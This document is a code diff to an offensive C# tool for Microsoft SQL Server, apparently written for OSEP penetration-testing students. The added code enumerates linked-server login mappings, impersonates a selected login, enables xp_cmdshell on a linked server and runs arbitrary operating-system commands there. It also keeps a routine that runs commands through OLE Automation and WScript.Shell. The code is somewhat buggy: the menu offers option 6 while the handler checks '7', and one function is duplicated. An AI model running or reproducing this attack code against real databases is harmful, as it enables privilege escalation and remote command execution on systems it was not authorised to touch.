@@ -9,14 +9,12 @@ namespace SQL
         static void Main(string[] args)
         {
             // Print the intro ASCII art to the console
-            Console.WriteLine(@" _______  _______  _       _________ _______  _       
-(  ____ \(  ___  )( (    /|\__   __/(  ___  )( \      
-| (    \/| (   ) ||  \  ( |   ) (   | (   ) || (      
-| (_____ | |   | ||   \ | |   | |   | |   | || |      
-(_____  )| |   | || (\ \) |   | |   | |   | || |      
-      ) || |   | || | \   |   | |   | | /\| || |      
-/\____) || (___) || )  \  |___) (___| (_\ \ || (____/\
-\_______)(_______)|/    )_)\_______/(____\/_)(_______/
+            Console.WriteLine(@" __  __       _____ _____  ____  _      
+|  \/  |     / ____/ ____|/ __ \| |     
+| \  / | ___| (___| (___ | |  | | |     
+| |\/| |/ _ \\___ \\___ \| |  | | |     
+| |  | |  __/____) |___) | |__| | |____ 
+|_|  |_|\___|_____/_____/ \___\_\______|
                                                        ");
 
             Console.WriteLine("Written by Extravenger mainly for OSEP folks.\n");
@@ -77,7 +75,7 @@ namespace SQL
                         }
                     }
                 }
-        
+
 
 
                 while (true)
@@ -92,8 +90,9 @@ namespace SQL
                     Console.WriteLine("\t" + "2. Impersonate a user (EXECUTE AS USER in current instance)");
                     Console.WriteLine("\t" + "3. Execute command on a linked server (EXEC AT LinkedServer)");
                     Console.WriteLine("\t" + "4. Perform xp_dirtree");
-                    Console.WriteLine("\t" + "5. Create new sysadmin user (local/remote)\n");
-                    Console.Write("[+] Enter 1, 2,3,4, or 5: ");
+                    Console.WriteLine("\t" + "5. Create new sysadmin user (local/remote)");
+                    Console.WriteLine("\t" + "6. Pull login-mapping and execute commands on linked server.\n");
+                    Console.Write("[+] Enter 1, 2,3,4,5 or 6: ");
                     string choice = Console.ReadLine();
 
                     if (choice.Equals("exit", StringComparison.OrdinalIgnoreCase))
@@ -242,6 +241,68 @@ namespace SQL
                             Console.WriteLine("[!] Invalid choice. Please enter 1 or 2.");
                         }
                     }
+
+                    if (choice == "7")
+                    {
+                        // Display list of logins to impersonate
+                        Console.WriteLine("\n[+] Retrieving login mappings...\n");
+
+                        // Fetch login mappings from the connected instance
+                        List<string> impersonableLogins2 = PullLoginMappings(con); // Updated variable name
+
+                        if (impersonableLogins2.Count == 0)
+                        {
+                            Console.WriteLine("[!] No login mappings found.");
+                        }
+                        else
+                        {
+                            Console.WriteLine("[+] Select a login to impersonate:\n");
+                            for (int i = 0; i < impersonableLogins2.Count; i++)
+                            {
+                                Console.WriteLine($"\t{i + 1}. {impersonableLogins2[i]}\n");
+                            }
+                            Console.Write("[+] Enter the number of the login to impersonate: ");
+                            int loginChoice = int.Parse(Console.ReadLine()) - 1;
+
+                            if (loginChoice >= 0 && loginChoice < impersonableLogins2.Count)
+                            {
+                                string selectedLogin = impersonableLogins2[loginChoice];
+
+                                // Step 1: Ask the user to input the linked server name dynamically
+                                Console.Write("[+] Enter the linked server name: ");
+                                string linkedServer = Console.ReadLine();
+
+                                if (string.IsNullOrEmpty(linkedServer))
+                                {
+                                    Console.WriteLine("[!] Linked server name cannot be empty.");
+                                    return;
+                                }
+
+                                // Step 2: Ask the user for the command to execute on the linked server
+                                Console.Write("[+] Enter the command to execute on the linked server: ");
+                                string userCommand = Console.ReadLine();
+
+                                if (string.IsNullOrEmpty(userCommand))
+                                {
+                                    Console.WriteLine("[!] Command cannot be empty.");
+                                    return;
+                                }
+
+                                // Step 3: Enable xp_cmdshell on the linked server
+                                EnableXpCmdShellOnLinkedServer(con, linkedServer);
+
+                                // Step 4: Impersonate the selected login and execute the user-specified command
+                                ImpersonateLoginAndExecute(con, selectedLogin, linkedServer, userCommand);
+                            }
+                            else
+                            {
+                                Console.WriteLine("[!] Invalid choice.");
+                            }
+                        }
+                    }
+
+
+
                     else
                     {
                         Console.WriteLine("[!] Invalid choice. Please enter 1, 2, or 3.");
@@ -303,9 +364,43 @@ namespace SQL
             return new string(stringChars);
         }
 
+        static List<string> GetLoginMappings(SqlConnection con)
+        {
+            List<string> impersonableLogins = new List<string>();
+
+            try
+            {
+                string query = @"
+            SELECT sp.name AS LocalLogin
+            FROM sys.linked_logins AS ll
+            JOIN sys.servers AS s ON ll.server_id = s.server_id
+            LEFT JOIN sys.server_principals AS sp ON ll.local_principal_id = sp.principal_id;
+        ";
+
+                SqlCommand command = new SqlCommand(query, con);
+                SqlDataReader reader = command.ExecuteReader();
+
+                while (reader.Read())
+                {
+                    string localLogin = reader["LocalLogin"]?.ToString();
+                    if (!string.IsNullOrEmpty(localLogin))
+                    {
+                        impersonableLogins.Add(localLogin);
+                    }
+                }
+
+                reader.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Error pulling login mappings: " + ex.Message);
+            }
+
+            return impersonableLogins;
+        }
 
 
-    static void ImpersonateLoginAndExecuteCommand(SqlConnection con, string impersonatedLogin)
+        static void ImpersonateLoginAndExecuteCommand(SqlConnection con, string impersonatedLogin)
         {
             try
             {
@@ -518,6 +613,35 @@ namespace SQL
         }
 
 
+        static void ImpersonateLoginAndExecute(SqlConnection con, string localLogin, string linkedServer, string userCommand)
+        {
+            try
+            {
+                // Impersonate the local login
+                string impersonateLoginQuery = $"EXECUTE AS LOGIN = '{localLogin}';";
+                SqlCommand command = new SqlCommand(impersonateLoginQuery, con);
+                command.ExecuteNonQuery();
+                Console.WriteLine($"\n[+] Impersonated login: {localLogin}");
+
+                // Enable xp_cmdshell on the linked server (assuming it's not already enabled)
+                EnableXpCmdShellOnLinkedServer(con, linkedServer);
+
+                // Execute the user command on the linked server
+                ExecuteCommandOnLinkedServer(con, linkedServer, userCommand);
+
+                // Revert to the original execution context
+                string revertQuery = "REVERT;";
+                command = new SqlCommand(revertQuery, con);
+                command.ExecuteNonQuery();
+                Console.WriteLine("\n[+] Reverted to original execution context.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Error impersonating login or executing command: " + ex.Message);
+            }
+        }
+
+
 
 
         static void ExecuteCommandOnLinkedServer(SqlConnection con, string linkedServer, string userCommand)
@@ -551,6 +675,47 @@ namespace SQL
                 Console.WriteLine("[!] Error executing command on linked server: " + ex.Message);
             }
         }
+
+
+        static List<string> PullLoginMappings(SqlConnection con)
+        {
+            List<string> impersonableLogins2 = new List<string>();
+
+            try
+            {
+                // Query to get login mappings from the linked servers
+                string query = @"
+            SELECT sp.name AS LocalLogin
+            FROM sys.linked_logins AS ll
+            JOIN sys.servers AS s ON ll.server_id = s.server_id
+            LEFT JOIN sys.server_principals AS sp ON ll.local_principal_id = sp.principal_id;
+        ";
+
+                SqlCommand command = new SqlCommand(query, con);
+                SqlDataReader reader = command.ExecuteReader();
+
+                // Collect the login mappings into a list
+                while (reader.Read())
+                {
+                    string localLogin = reader["LocalLogin"]?.ToString();
+                    if (!string.IsNullOrEmpty(localLogin))
+                    {
+                        impersonableLogins2.Add(localLogin); // Using the new variable name
+                    }
+                }
+
+                reader.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Error pulling login mappings: " + ex.Message);
+            }
+
+            return impersonableLogins2; // Return the new list of logins
+        }
+
+
+
 
         static List<string> ListImpersonableLogins(SqlConnection con)
         {
@@ -635,41 +800,41 @@ namespace SQL
         }
 
         static void ExecuteCommandWithSpOaMethod(SqlConnection con, string usercommand)
-{
-    try
-    {
-        // Ensure OLE Automation Procedures are enabled
-        string enableOleAutomation = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
-        SqlCommand enableCommand = new SqlCommand(enableOleAutomation, con);
-        enableCommand.ExecuteNonQuery();
-        Console.WriteLine("[+] Enabled OLE Automation Procedures.\n");
+        {
+            try
+            {
+                // Ensure OLE Automation Procedures are enabled
+                string enableOleAutomation = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
+                SqlCommand enableCommand = new SqlCommand(enableOleAutomation, con);
+                enableCommand.ExecuteNonQuery();
+                Console.WriteLine("[+] Enabled OLE Automation Procedures.\n");
 
-        // Create and use the WScript.Shell instance in a single batch
-        string execCmd = $@"
+                // Create and use the WScript.Shell instance in a single batch
+                string execCmd = $@"
             DECLARE @shell INT;
             EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
             EXEC sp_oamethod @shell, 'Run', NULL, '{usercommand}', 0, TRUE;
             EXEC sp_OADestroy @shell;";  // Clean up the created COM object
 
-        SqlCommand command = new SqlCommand(execCmd, con);
-        SqlDataReader reader = command.ExecuteReader();
+                SqlCommand command = new SqlCommand(execCmd, con);
+                SqlDataReader reader = command.ExecuteReader();
 
-        // Revert impersonation after executing the command
-        string revertCmd = "REVERT;";
-        SqlCommand revertCommand = new SqlCommand(revertCmd, con);
-        revertCommand.ExecuteNonQuery();
-        Console.WriteLine("\n[+] Reverted impersonation.\n");
+                // Revert impersonation after executing the command
+                string revertCmd = "REVERT;";
+                SqlCommand revertCommand = new SqlCommand(revertCmd, con);
+                revertCommand.ExecuteNonQuery();
+                Console.WriteLine("\n[+] Reverted impersonation.\n");
 
-        // Simply indicate that the command executed successfully
-        Console.WriteLine("[+] Command executed successfully.");
+                // Simply indicate that the command executed successfully
+                Console.WriteLine("[+] Command executed successfully.");
 
-        reader.Close();
-    }
-    catch (Exception ex)
-    {
-        Console.WriteLine("[!] Error executing command with sp_oamethod: " + ex.Message);
-    }
-}
+                reader.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Error executing command with sp_oamethod: " + ex.Message);
+            }
+        }
 
 
         static void ExecuteCommandWithXpCmdShell(SqlConnection con, string usercommand)
